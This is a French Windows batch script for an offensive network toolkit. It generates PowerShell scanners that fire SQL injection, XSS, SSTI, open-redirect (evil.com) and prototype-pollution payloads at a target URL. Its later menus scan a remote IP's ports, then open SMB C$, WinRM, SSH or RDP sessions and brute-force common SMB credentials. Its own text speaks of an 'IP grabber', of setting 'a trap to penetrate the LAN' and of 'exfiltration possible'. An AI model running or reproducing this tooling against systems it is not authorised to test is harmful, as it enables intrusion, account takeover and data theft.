echo     'PDOException','java.sql.','unterminated quoted string' >> "%WPS%"
echo ) >> "%WPS%"
echo $uri2 = [uri]$url >> "%WPS%"
echo $q2 = $uri2.Query.TrimStart('?') >> "%WPS%"
echo $existingParams = $q2.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries) >> "%WPS%"
echo $targets = if ($existingParams.Count -gt 0) { $existingParams ^| ForEach-Object { $_.Split('=')[0] } } else { $baseParams } >> "%WPS%"
echo $wafCount = 0 >> "%WPS%"
echo. >> "%WPS%"
echo foreach ($ta in $targets) { >> "%WPS%"
echo     Write-Host "  Test param : $ta ..." -f DarkGray -NoNewline >> "%WPS%"
echo     $gotResult = $false >> "%WPS%"
echo     foreach ($p in $sqlPayloads) { >> "%WPS%"
echo         if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%WPS%"
echo         $encodedP = [uri]::EscapeDataString($p) >> "%WPS%"
echo         $testUrl = if ($url -like "*${ta}=*") { $url -replace "${ta}=[^&]*", "${ta}=$encodedP" } else { if ($url.Contains('?')) { "${url}^&${ta}=$encodedP" } else { "${url}?${ta}=$encodedP" } } >> "%WPS%"
echo         try { >> "%WPS%"
echo             $tr = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing >> "%WPS%"
echo             if ($tr.StatusCode -in 403,406,429) { $wafCount++; $gotResult = $true; break } >> "%WPS%"
echo             if ($tr.Content -and ($sqlErrors ^| Where-Object { $tr.Content -match $_ })) { >> "%WPS%"
echo                 Write-Host " VULN !" -f Red >> "%WPS%"
echo                 Print-Result 'CRITICAL' "SQLi detectee (param:$ta) payload: $p" >> "%WPS%"
echo                 $gotResult = $true; break >> "%WPS%"
echo             } >> "%WPS%"
echo         } catch { >> "%WPS%"
echo             if ($_.Exception.Response.StatusCode.value__ -in 403,406) { $wafCount++; $gotResult = $true; break } >> "%WPS%"
echo         } >> "%WPS%"
echo     } >> "%WPS%"
echo     if (-not $gotResult) { >> "%WPS%"
echo         $start = Get-Date >> "%WPS%"
echo         try { $null = Invoke-WebRequest ("${url}?${ta}=" + [uri]::EscapeDataString("1' AND SLEEP(4)--")) -TimeoutSec 8 -EA SilentlyContinue -UseBasicParsing } catch {} >> "%WPS%"
echo         if (((Get-Date) - $start).TotalSeconds -gt 3.5) { >> "%WPS%"
echo             Write-Host " TIME-BASED !" -f Red >> "%WPS%"
echo             Print-Result 'CRITICAL' "SQLi Time-based sur param [$ta]" >> "%WPS%"
echo         } else { >> "%WPS%"
echo             Write-Host " OK" -f Green >> "%WPS%"
echo         } >> "%WPS%"
echo     } else { >> "%WPS%"
echo         if (-not ($script:findings ^| Where-Object { $_.Msg -match $ta })) { Write-Host " WAF" -f Yellow } >> "%WPS%"
echo     } >> "%WPS%"
echo } >> "%WPS%"
echo if ($wafCount -gt 0) { Write-Host "  [INFO] WAF/protection detecte sur $wafCount parametres" -f Yellow } >> "%WPS%"
echo $sqliHdr = ([char]39 + ' OR 1=1--') >> "%WPS%"
echo $sqlHdrs = @('X-Forwarded-For','X-Real-IP','Referer') >> "%WPS%"
echo foreach ($hdr in $sqlHdrs) { >> "%WPS%"
echo     try { >> "%WPS%"
echo         $rH = Invoke-WebRequest $url -Headers @{$hdr=$sqliHdr} -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo         if ($rH -and ($sqlErrors ^| Where-Object { $rH.Content -match $_ })) { Print-Result 'CRITICAL' "SQLi via header $hdr !" } >> "%WPS%"
echo     } catch {} >> "%WPS%"
echo } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 4/7 - XSS REFLECTE >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 4 7 "XSS Reflecte" >> "%WPS%"
echo $xssPayloads = @( >> "%WPS%"
echo     ([char]60+'script'+[char]62+'alert(1)'+[char]60+'/script'+[char]62), >> "%WPS%"
echo     ([char]34+'^><img src=x onerror=alert(1)^>'), >> "%WPS%"
echo     ([char]39+'^><svg/onload=alert(1)^>'), >> "%WPS%"
echo     'javascript:alert(1)', >> "%WPS%"
echo     ([char]60+'body onload=alert(1)'+[char]62), >> "%WPS%"
echo     ([char]60+'details open ontoggle=alert(1)'+[char]62), >> "%WPS%"
echo     ([char]60+'img src=x onerror=confirm(1)'+[char]62) >> "%WPS%"
echo ) >> "%WPS%"
echo $xssFound = $false >> "%WPS%"
echo foreach ($ta in $targets) { >> "%WPS%"
echo     Write-Host "  Test XSS param : $ta ..." -f DarkGray -NoNewline >> "%WPS%"
echo     $xssHit = $false >> "%WPS%"
echo     foreach ($xp in $xssPayloads) { >> "%WPS%"
echo         if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%WPS%"
echo         $encXss = [uri]::EscapeDataString($xp) >> "%WPS%"
echo         $testUrlXSS = if ($url -like "*${ta}=*") { $url -replace "${ta}=[^&]*", "${ta}=$encXss" } else { if ($url.Contains('?')) { "${url}^&${ta}=$encXss" } else { "${url}?${ta}=$encXss" } } >> "%WPS%"
echo         try { >> "%WPS%"
echo             $trX = Invoke-WebRequest $testUrlXSS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo             if ($trX -and $trX.Content -match [regex]::Escape($xp)) { >> "%WPS%"
echo                 Write-Host " VULN !" -f Red >> "%WPS%"
echo                 Print-Result 'HIGH' "XSS Reflecte detecte (param:$ta)" >> "%WPS%"
echo                 $xssFound = $true; $xssHit = $true; break >> "%WPS%"
echo             } >> "%WPS%"
echo         } catch {} >> "%WPS%"
echo     } >> "%WPS%"
echo     if (-not $xssHit) { Write-Host " OK" -f Green } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $xssFound) { Write-Host "  [OK] Aucun XSS reflecte detecte." -f Green } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 5/7 - SSTI >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 5 7 "SSTI (Template Injection)" >> "%WPS%"
echo $sstiPayloads = @('{{7*7}}','${7*7}','#{7*7}','*{7*7}','__${7*7}__') >> "%WPS%"
echo $sstiFound = $false >> "%WPS%"
echo foreach ($ta in $targets) { >> "%WPS%"
echo     foreach ($sp in $sstiPayloads) { >> "%WPS%"
echo         $encS = [uri]::EscapeDataString($sp) >> "%WPS%"
echo         $testS = if ($url -like "*${ta}=*") { $url -replace "${ta}=[^&]*", "${ta}=$encS" } else { if ($url.Contains('?')) { "${url}^&${ta}=$encS" } else { "${url}?${ta}=$encS" } } >> "%WPS%"
echo         try { >> "%WPS%"
echo             $rs = Invoke-WebRequest $testS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo             if ($rs -and $rs.Content -match '(?<![0-9])49(?![0-9])') { >> "%WPS%"
echo                 Print-Result 'CRITICAL' "SSTI possible (param:$ta payload:$sp)" >> "%WPS%"
echo                 $sstiFound = $true >> "%WPS%"
echo             } >> "%WPS%"
echo         } catch {} >> "%WPS%"
echo     } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $sstiFound) { Write-Host "  [OK] Aucun SSTI detecte." -f Green } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 6/7 - CORS et Open Redirect >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 6 7 "CORS et Open Redirect" >> "%WPS%"
echo try { >> "%WPS%"
echo     $cors = Invoke-WebRequest $url -Headers @{Origin='https://evil.com'} -UserAgent $ua -TimeoutSec 6 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     $acao = $cors.Headers['Access-Control-Allow-Origin'] >> "%WPS%"
echo     $acac = $cors.Headers['Access-Control-Allow-Credentials'] >> "%WPS%"
echo     if ($acao -eq '*')           { Print-Result 'MEDIUM' "CORS permissif (*)" } >> "%WPS%"
echo     elseif ($acao -match 'evil') { Print-Result 'HIGH'   "CORS reflecte l'origine malveillante !" } >> "%WPS%"
echo     if ($acac -eq 'true' -and $acao) { Print-Result 'HIGH' "CORS credentials=true (vol session possible)" } >> "%WPS%"
echo     if (-not $acao) { Write-Host "  [OK] Pas de header CORS." -f Green } >> "%WPS%"
echo } catch {} >> "%WPS%"
echo $redParams = @('redirect','url','next','dest','return','goto','target','forward','redir') >> "%WPS%"
echo $redFound = $false >> "%WPS%"
echo foreach ($ta in $redParams) { >> "%WPS%"
echo     $testRed = if ($url.Contains('?')) { "${url}^&${ta}=https://evil.com" } else { "${url}?${ta}=https://evil.com" } >> "%WPS%"
echo     try { >> "%WPS%"
echo         $trR = Invoke-WebRequest $testRed -UserAgent $ua -MaximumRedirection 0 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo         if ($trR.Headers['Location'] -match 'evil') { Print-Result 'MEDIUM' "Open Redirect (param:$ta)"; $redFound=$true } >> "%WPS%"
echo     } catch { >> "%WPS%"
echo         if ($_.Exception.Response.Headers['Location'] -match 'evil') { Print-Result 'MEDIUM' "Open Redirect (param:$ta)"; $redFound=$true } >> "%WPS%"
echo     } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $redFound) { Write-Host "  [OK] Aucun Open Redirect detecte." -f Green } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 7/7 - DIVERS >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 7 7 "Rate Limit / Misc" >> "%WPS%"
echo $rl_blocked = $false >> "%WPS%"
echo for ($i = 0; $i -lt 6; $i++) { >> "%WPS%"
echo     try { >> "%WPS%"
echo         $rlr = Invoke-WebRequest $url -UserAgent $ua -TimeoutSec 3 -EA Stop -UseBasicParsing >> "%WPS%"
echo         if ($rlr.StatusCode -eq 429) { Write-Host "  [OK] Rate limiting actif (HTTP 429)" -f Green; $rl_blocked = $true; break } >> "%WPS%"
echo     } catch { if ($_.Exception.Response.StatusCode.value__ -eq 429) { Write-Host "  [OK] Rate limiting actif" -f Green; $rl_blocked = $true; break } } >> "%WPS%"
echo } >> "%WPS%"
echo if (-not $rl_blocked) { Print-Result 'LOW' "Aucun rate limiting detecte" } >> "%WPS%"
echo $ppSep = if ($url.Contains('?')) { '^&' } else { '?' } >> "%WPS%"
echo try { >> "%WPS%"
echo     $pp = Invoke-WebRequest "${url}${ppSep}__proto__[x]=polluted" -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     if ($pp -and $pp.Content -match 'polluted') { Print-Result 'HIGH' "Prototype Pollution possible" } >> "%WPS%"
echo } catch {} >> "%WPS%"
echo $baseClean = ($url -split '\?')[0].TrimEnd('/') >> "%WPS%"
echo try { >> "%WPS%"
echo     $stxt = Invoke-WebRequest "$baseClean/.well-known/security.txt" -TimeoutSec 4 -EA SilentlyContinue -UseBasicParsing >> "%WPS%"
echo     if ($stxt -and $stxt.StatusCode -eq 200) { Write-Host "  [OK] security.txt present (bonne pratique)" -f Green } >> "%WPS%"
echo     else { Write-Host "  [INFO] Pas de security.txt" -f DarkGray } >> "%WPS%"
echo } catch { Write-Host "  [INFO] Pas de security.txt" -f DarkGray } >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # SCORE FINAL >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo if ($script:score -lt 0) { $script:score = 0 } >> "%WPS%"
echo $grade = if($script:score -ge 90){'A  - Excellent'}elseif($script:score -ge 75){'B  - Bon'}elseif($script:score -ge 50){'C  - Moyen'}elseif($script:score -ge 25){'D  - Mauvais'}else{'F  - Critique'} >> "%WPS%"
echo $gc    = if($script:score -ge 75){'Green'}elseif($script:score -ge 50){'Yellow'}else{'Red'} >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo Write-Host "  ================================================" -f Cyan >> "%WPS%"
echo Write-Host "  Score securite : $script:score / 100" -f $gc >> "%WPS%"
echo Write-Host "  Grade          : $grade" -f $gc >> "%WPS%"
echo Write-Host "  Findings       : $($script:findings.Count) vulnerabilite(s)" -f White >> "%WPS%"
echo if ($script:findings.Count -gt 0) { >> "%WPS%"
echo     if ($low  -gt 0) { Write-Host "    LOW      : $low"  -f Cyan } >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] ANALYSE RAPIDE DES RISQUES :" -f Red >> "%WPS%"
echo     if ($crit -gt 0) { Write-Host "  - CRITIQUE : Prise de controle totale (RCE) ou vol de base de donnees." -f Magenta } >> "%WPS%"
echo     if ($high -gt 0) { Write-Host "  - ELEVE : Piratage de comptes utilisateurs (cookies/XSS) ou vol de sessions." -f Red } >> "%WPS%"
echo     if ($med  -gt 0) { Write-Host "  - MOYEN : Fuite d'infos techniques ou redirection vers des sites malveillants." -f Yellow } >> "%WPS%"
echo     Write-Host "  CONSEIL : Corrigez les failles dans l'ordre de leur priorite (Critique d'abord)." -f Cyan >> "%WPS%"
echo } >> "%WPS%"
echo Write-Host "  ================================================" -f Cyan >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo Write-Host "  [OK] Scan termine !" -f Green >> "%WPS%"
echo. >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host ("`n  [ERREUR FATALE] " + $_.Exception.Message) -f Red >> "%WPS%"
echo     Write-Host "  Verifiez que l'URL est accessible." -f DarkGray >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
echo.
pause
goto net_cyber_menu


:cyber_dns_leak
cls
echo.
echo  ================================================
echo   TEST DE FUITE DNS (DNS LEAK)
echo  ================================================
echo   Verifie si vos requetes DNS sont bien
echo   anonymisees via votre VPN.
echo.
echo  Serveurs DNS actuellement configures :
powershell -NoProfile -Command "Get-DnsClientServerAddress | Where-Object {$_.ServerAddresses} | Select-Object @{N='Interface';E={$_.InterfaceAlias}}, @{N='Protocole';E={$_.AddressFamily}}, @{N='Serveurs_DNS';E={$_.ServerAddresses}} | Format-Table -AutoSize"
echo.
echo  Resolution de test vers un domaine public :
powershell -NoProfile -Command "try { $r = Resolve-DnsName 'whoami.akamai.net' -EA Stop; Write-Host ('  IP resolue : ' + $r.IP4Address) -f Green } catch { Write-Host '  Impossible de resoudre le domaine de test.' -f Red }"
echo.
echo  [i] CONSEIL : Si vous utilisez un VPN, vous ne devriez PAS voir les IP
echo      de votre box internet ici. Utilisez 1.1.1.1 ou 8.8.8.8 pour plus de securite.
pause
if defined _net_back goto %_net_back%
goto net_cyber_menu

REM ===================================================================
REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
REM ===================================================================

:cyber_lan_scan
goto cyber_ip_grabber
:cyber_lan_auto
set "base_ip=AUTO"
goto start_lan_scan

:cyber_lan_custom
cls
echo.
echo  ================================================
echo   SCANNER PERSONNALISE (LAN OU WAN)
echo  ================================================
echo.
echo  EXEMPLES DE SAISIE :
echo.
echo  - Reseau local :          192.168.1   (scanne .1 a .254)
echo  - IP unique :             192.168.1.50
echo  - Reseau box distante :   192.168.1 ou 10.0.0 (adresse PRIVEE de sa box)
echo.
echo  [!] L'IP publique WAN de votre cible (type IPv6 ou 82.x.x.x)
echo      ne scanne PAS les appareils de son reseau local.
echo      Utilisez le module IP GRABBER pour obtenir son IP, puis
echo      connectez-vous en SSH ou WinRM pour un scan interne reel.
echo.
call :InputWithEsc "Base IP ou IP unique : " base_ip
if errorlevel 1 goto cyber_ip_grabber
if "%base_ip%"=="" goto cyber_ip_grabber
goto start_lan_scan

:cyber_remote_connect
cls
echo.
echo  ================================================
echo   ANALYSE FAILLES ^& ACCES DISTANT (WAN/LAN)
echo  ================================================
echo.
echo  [i] Pour eviter les conflits avec votre reseau local,
echo      utilisez l'IP PUBLIQUE ou un DNS (ex: ma-box.ddns.net).
echo.
call :InputWithEsc "IP Cible ou DNS (ex: 82.x.x.x) : " remote_ip
if errorlevel 1 goto cyber_ip_grabber
if "%remote_ip%"=="" goto cyber_ip_grabber

echo.
echo  [?] Port specifique ? (Laissez vide pour les ports par defaut)
echo      (Ex: 2222 si votre box redirige le port 2222 vers le 22 d'un PC)
call :InputWithEsc "Port (Optionnel) : " remote_port
if errorlevel 1 goto cyber_ip_grabber
if not defined remote_port set "remote_port=NONE"
goto cyber_remote_menu

:cyber_remote_menu
set "remote_info_title=ACTIONS DISTANTES - [ !remote_ip! ]"
if defined remote_pc set "remote_info_title=ACTIONS DISTANTES - [ !remote_pc! @ !remote_ip! ]"
set "opts=Explorer les partages secrets SMB (C$, Admin$)~Acces immediat aux fichiers si le partage est accessible;Ouvrir une session PowerShell (WinRM)~Shell distant si le port 5985 est ouvert;Se connecter via SSH~Terminal complet si le port 22 est ouvert;Scanner profondement toutes les failles~Scan exhaustif ports - vulns - SMB - RDP (lent);RETOUR"
call :DynamicMenu "!remote_info_title!" "%opts%" "NONUMS"
set "rc_opt=%errorlevel%"

REM --- [1] Explorer partages SMB ---
if "%rc_opt%"=="1" (set "smb_ret=cyber_remote_menu" & goto smb_explore)

REM --- [2] Session WinRM/PowerShell ---
if "%rc_opt%"=="2" (
    cls
    echo.
    echo [i] Tentative de connexion WinRM Remote PowerShell sur !remote_ip!...
    powershell -NoProfile -Command "Enter-PSSession -ComputerName !remote_ip! -Credential (Get-Credential)"
    pause
    goto cyber_remote_menu
)

REM --- [3] SSH ---
if "%rc_opt%"=="3" (
    cls
    echo.
    echo [i] Connexion distante SSH...
    set /p "ssh_user=Utilisateur cible : "
    if not defined ssh_user goto cyber_remote_menu
    if "!remote_port!"=="NONE" (
        ssh !ssh_user!@!remote_ip!
    ) else (
        ssh -p !remote_port! !ssh_user!@!remote_ip!
    )
    pause
    goto cyber_remote_menu
)

REM --- [4] Scan complet ---
if "%rc_opt%"=="4" ( set "base_ip=!remote_ip!" & goto start_lan_scan )

if "%rc_opt%"=="5" goto cyber_ip_grabber
goto cyber_remote_menu

REM ===================================================================
REM   MODULE : SCAN IP PUBLIQUE - DETECTION PORT FORWARDING
REM ===================================================================
:smb_explore
cls
echo.
echo %B%  ================================================%N%
echo %B%   EXPLORATION PARTAGES SMB DISTANTS%N%
echo %B%  ================================================%N%
echo  %Y%Cible :%N% !remote_ip!
echo.
echo  %Y%[1]%N% Listage des partages accessibles...
net view \\!remote_ip! /all 2>nul
if %errorlevel% neq 0 (
    echo  %R%[!] Partages inaccessibles - connexion refusee ou SMB bloque.%N%
    echo.
    pause >nul
    goto cyber_remote_menu
)
echo.
call :DynamicMenu "Ouvrir le disque C$ dans l'explorateur ?" "Ouvrir C$~Lance l'Explorateur sur \\cible\C$;Annuler" "NONUMS NOCLS"
if "%errorlevel%"=="0" goto smb_explore_end
if "%errorlevel%"=="2" goto smb_explore_end
set "smb_host2=!remote_ip!"
set "tmp_v6b=!remote_ip::=!"
if not "!tmp_v6b!"=="!remote_ip!" set "smb_host2=!remote_ip::=-!.ipv6-literal.net"
net use \\!smb_host2!\C$ >nul 2>&1
if not errorlevel 1 goto smb_exp_launch
echo  [i] Acces refuse sans credentials - tentative avec mot de passe...
set "smb_user=!remote_user!"
if not defined smb_user set /p "smb_user=  Utilisateur : "
:smb_exp_pwd_loop
set "smb_pass="
set /p "smb_pass=  Mot de passe (vide = annuler) : "
if not defined smb_pass goto smb_explore_end
net use \\!smb_host2!\C$ "!smb_pass!" /user:"!smb_user!" >nul 2>&1
if errorlevel 1 (echo  [-] Echec - reessayez. & goto smb_exp_pwd_loop)
echo  [+] Connecte ^!
set "smb_pass="
:smb_exp_launch
start "" "\\!smb_host2!\C$"
:smb_explore_end
echo.
pause >nul
if defined smb_ret (goto !smb_ret!)
goto cyber_remote_menu

:wan_public_scan
cls
echo.
echo %B%  ================================================%N%
echo %B%   SCAN DES FAILLES ET PORTS DE LA CIBLE DISTANTE%N%
echo %B%  ================================================%N%
echo.
echo  %Y%[i] Cible WAN :%N% !remote_ip!
echo  %Y%[i]%N% Analyse de vulnerabilite en cours...
echo  %Y%[i]%N% Appuyez sur ECHAP pour annuler.
echo.

set "WANS=%TEMP%\wan_scan_%RANDOM%.ps1"
set "WPORTS=%TEMP%\wan_ports_result.txt"
if exist "%WANS%" del /f /q "%WANS%"
if exist "%WPORTS%" del /f /q "%WPORTS%"

>>  "%WANS%" echo $Host.UI.RawUI.FlushInputBuffer()
>>  "%WANS%" echo $ip = "!remote_ip!"
>>  "%WANS%" echo $wanPorts = @(
>>  "%WANS%" echo     @{P=21;  N="FTP";         R="MEDIUM";   H="Transfert fichiers en clair"},
>>  "%WANS%" echo     @{P=22;  N="SSH";         R="HIGH";     H="Terminal complet possible !"},
>>  "%WANS%" echo     @{P=23;  N="Telnet";      R="HIGH";     H="Protocole sans chiffrement"},
>>  "%WANS%" echo     @{P=25;  N="SMTP";        R="LOW";      H="Serveur mail"},
>>  "%WANS%" echo     @{P=53;  N="DNS";         R="LOW";      H="Resolution de noms"},
>>  "%WANS%" echo     @{P=80;  N="HTTP";        R="LOW";      H="Interface web"},
>>  "%WANS%" echo     @{P=110; N="POP3";        R="MEDIUM";   H="Serveur mail entrant"},
>>  "%WANS%" echo     @{P=135; N="RPC";         R="HIGH";     H="Service RPC Windows"},
>>  "%WANS%" echo     @{P=139; N="NetBIOS";     R="HIGH";     H="Partages locaux Windows"},
>>  "%WANS%" echo     @{P=143; N="IMAP";        R="MEDIUM";   H="Serveur mail entrant"},
>>  "%WANS%" echo     @{P=443; N="HTTPS";       R="LOW";      H="Interface web securisee"},
>>  "%WANS%" echo     @{P=445; N="SMB";         R="CRITICAL"; H="EternalBlue / WannaCry risque !"},
>>  "%WANS%" echo     @{P=465; N="SMTPS";       R="LOW";      H="Serveur mail securise"},
>>  "%WANS%" echo     @{P=587; N="SMTP";        R="LOW";      H="Serveur mail soumis"},
>>  "%WANS%" echo     @{P=993; N="IMAPS";       R="LOW";      H="Serveur mail securise"},
>>  "%WANS%" echo     @{P=995; N="POP3S";       R="LOW";      H="Serveur mail securise"},
>>  "%WANS%" echo     @{P=1433;N="MSSQL";       R="CRITICAL"; H="BDD SQL Server exposee !"},
>>  "%WANS%" echo     @{P=1521;N="Oracle";      R="CRITICAL"; H="BDD Oracle exposee !"},
>>  "%WANS%" echo     @{P=2049;N="NFS";         R="HIGH";     H="Partage de fichiers Linux"},
>>  "%WANS%" echo     @{P=3306;N="MySQL";       R="CRITICAL"; H="Base de donnees exposee !"},
>>  "%WANS%" echo     @{P=3389;N="RDP";         R="HIGH";     H="Bureau a distance Windows"},
>>  "%WANS%" echo     @{P=5432;N="PostgreSQL";  R="CRITICAL"; H="Base de donnees exposee !"},
>>  "%WANS%" echo     @{P=5900;N="VNC";         R="HIGH";     H="Acces ecran a distance"},
>>  "%WANS%" echo     @{P=5985;N="WinRM";       R="HIGH";     H="PowerShell distant Windows"},
>>  "%WANS%" echo     @{P=8080;N="HTTP-Alt";    R="MEDIUM";   H="Interface admin ou proxy"},
>>  "%WANS%" echo     @{P=8443;N="HTTPS-Alt";   R="MEDIUM";   H="Interface admin securisee"}
>>  "%WANS%" echo ^)
>>  "%WANS%" echo if ("!remote_port!" -ne "NONE" -and "!remote_port!" -match "^\d+$") { $wanPorts += @{P=[int]"!remote_port!"; N="Port Custom"; R="HIGH"; H="Port specifie manuellement"} }
>>  "%WANS%" echo $ipObj = $null
>>  "%WANS%" echo try { $ipObj = [System.Net.IPAddress]::Parse($ip) } catch { Write-Host "  [!] IP invalide : $ip" -ForegroundColor Red; Set-Content "%WPORTS%" "NONE" -Encoding ASCII; exit 1 }
>>  "%WANS%" echo $found = @()
>>  "%WANS%" echo foreach ($e in $wanPorts) {
>>  "%WANS%" echo     $esc = $false
>>  "%WANS%" echo     if ($Host.UI.RawUI.KeyAvailable) { if ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 27) { $esc=$true } }
>>  "%WANS%" echo     if ($esc) { break }
>>  "%WANS%" echo     [Console]::Write("`r  [*] Test port $($e.P) ($($e.N))...    ")
>>  "%WANS%" echo     $tcp = New-Object System.Net.Sockets.TcpClient($ipObj.AddressFamily)
>>  "%WANS%" echo     try {
>>  "%WANS%" echo         $c = $tcp.BeginConnect($ipObj, $e.P, $null, $null)
>>  "%WANS%" echo         if ($c.AsyncWaitHandle.WaitOne(800, $false) -and $tcp.Connected) {
>>  "%WANS%" echo             $col = switch($e.R){ "CRITICAL"{"Magenta"}; "HIGH"{"Red"}; "MEDIUM"{"Yellow"}; default{"Cyan"} }
>>  "%WANS%" echo             Write-Host ("`r  [PORT OUVERT] $($e.P.ToString().PadRight(5)) $($e.N.PadRight(12)) [$($e.R.PadRight(8))] $($e.H)") -f $col
>>  "%WANS%" echo             $found += $e
>>  "%WANS%" echo         }
>>  "%WANS%" echo     } catch {} finally { $tcp.Close() }
>>  "%WANS%" echo }
>>  "%WANS%" echo [Console]::Write("`r" + (" " * 55) + "`r")
>>  "%WANS%" echo Write-Host ""
>>  "%WANS%" echo if ($found.Count -eq 0) {
>>  "%WANS%" echo     Write-Host "  [OK] Aucun port critique expose depuis internet." -f Green
>>  "%WANS%" echo     Write-Host "  [i] La box bloque tout. Utilisez un piege pour penetrer le LAN interne." -f Yellow
>>  "%WANS%" echo     Set-Content "%WPORTS%" "NONE" -Encoding ASCII
>>  "%WANS%" echo } else {
>>  "%WANS%" echo     Write-Host "  [$($found.Count) service(s) expose(s) detecte(s) - Exfiltration possible !]" -f Red
>>  "%WANS%" echo     Set-Content "%WPORTS%" (($found ^| ForEach-Object { [string]$_.P }) -join ",") -Encoding ASCII
>>  "%WANS%" echo }

powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WANS%"
if exist "%WANS%" del /f /q "%WANS%"
set "found_ports="
set /p found_ports=<"%WPORTS%"
if exist "%WPORTS%" del /f /q "%WPORTS%"

echo.
if "!found_ports!"=="NONE" (
    echo  [i] Appuyez sur une touche pour continuer...
    pause >nul
    goto cyber_ip_grabber
)
if not defined found_ports (
    echo  [!] Aucun resultat - Appuyez sur une touche pour continuer...
    pause >nul
    goto cyber_ip_grabber
)

:wan_post_scan
set "fp=,!found_ports!,"
call :DynamicMenu "QUE FAIRE AVEC CETTE CIBLE ?" "J'ai le mot de passe~Connexion directe : RDP, SSH, SMB C$, WinRM, RPC;Je n'ai pas le mot de passe~Tests anonymes + recherche de credentials;Retour" "NONUMS NOCLS"
set "pwd_ch=%errorlevel%"
if "%pwd_ch%"=="0" goto cyber_ip_grabber
if "%pwd_ch%"=="1" goto wan_menu_creds
if "%pwd_ch%"=="2" goto wan_menu_nocreds
goto cyber_ip_grabber

:wan_menu_creds
set "fwd_opts=Retour"
set "fwd_actions=retour"
if not "!fp:,135,=!"=="!fp!" set "fwd_opts=[RPC] WMI/DCOM~Enumeration WMI distante (firewall requis);!fwd_opts!" & set "fwd_actions=rpc_enum,!fwd_actions!"
if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Acces disque C$~Monte le partage C$ avec identifiants;!fwd_opts!" & set "fwd_actions=smb_creds,!fwd_actions!"
if not "!fp:,5985,=!"=="!fp!" set "fwd_opts=[WinRM] Session PowerShell~Shell distant via WinRM;!fwd_opts!" & set "fwd_actions=winrm,!fwd_actions!"
if not "!fp:,22,=!"=="!fp!" set "fwd_opts=[SSH] Connexion terminal~Shell SSH avec identifiants;!fwd_opts!" & set "fwd_actions=ssh,!fwd_actions!"
if not "!fp:,3389,=!"=="!fp!" set "fwd_opts=[RDP] Bureau a distance~Interface graphique distante;!fwd_opts!" & set "fwd_actions=rdp,!fwd_actions!"
call :DynamicMenu "CONNEXION AVEC MOT DE PASSE" "!fwd_opts!" "NONUMS NOCLS"
set "fwd_ch=%errorlevel%"
if "%fwd_ch%"=="0" goto wan_post_scan
goto wan_dispatch

:wan_menu_nocreds
set "fwd_opts=Retour"
set "fwd_actions=retour"
if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[BRUTE] Tester credentials communs~Teste admin/guest avec mots de passe courants (SMB);!fwd_opts!" & set "fwd_actions=smb_brute,!fwd_actions!"
if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[MANUEL] Saisir un mot de passe~Tester manuellement vos propres mots de passe;!fwd_opts!" & set "fwd_actions=manual_pass,!fwd_actions!"
if not "!fp:,445,=!"=="!fp!" set "fwd_opts=Explorer partages SMB~Parcourir C$, Admin$ et partages;!fwd_opts!" & set "fwd_actions=smb,!fwd_actions!"
if not "!fp:,445,=!"=="!fp!" set "fwd_opts=[SMB] Test session anonyme~Connexion IPC$ sans identifiants;!fwd_opts!" & set "fwd_actions=smb_null,!fwd_actions!"
if not "!fp:,21,=!"=="!fp!" set "fwd_opts=[FTP] Login anonyme~Test acces FTP sans compte;!fwd_opts!" & set "fwd_actions=ftp_anon,!fwd_actions!"
call :DynamicMenu "ACCES SANS MOT DE PASSE" "!fwd_opts!" "NONUMS NOCLS"
set "fwd_ch=%errorlevel%"
if "%fwd_ch%"=="0" goto wan_post_scan
goto wan_dispatch

:wan_dispatch
set "sel_action="
set "idx=0"
for %%A in (!fwd_actions!) do (
    set /a idx+=1
    if "!idx!"=="!fwd_ch!" set "sel_action=%%A"
)
if "!sel_action!"=="rdp" (
    echo.
    echo  [i] Lancement connexion Bureau a distance vers !remote_ip!...
    start mstsc /v:!remote_ip!
    pause
    goto wan_menu_creds
)
if "!sel_action!"=="ssh" (
    echo.
